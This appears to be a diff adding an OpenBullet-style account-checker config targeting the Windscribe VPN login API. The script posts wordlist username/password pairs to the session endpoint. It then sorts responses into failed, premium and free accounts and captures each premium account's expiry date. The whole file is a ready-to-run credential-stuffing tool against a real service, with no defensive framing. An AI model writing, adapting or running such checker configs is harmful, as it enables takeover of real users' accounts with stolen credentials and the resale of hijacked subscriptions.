@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "WindScribe",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-16T02:09:55.5870443-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.windscribe.com/Session" 
+  CONTENT "{\"password\":\"<PASS>\",\"username\":\"<USER>\",\"session_type_id\":2,\"time\":\"1555398244400\",\"client_auth_hash\":\"6b96cf557b1886cdd62401b3e2b3ec92\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Accept: application/json, text/plain, */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Could not log in with provided credentials" 
+  KEYCHAIN Success OR 
+    KEY "is_premium\": 1," 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "is_premium\": 0," 
+
+PARSE "<SOURCE>" JSON "premium_expiry_date" -> CAP "Expire Date" 
+
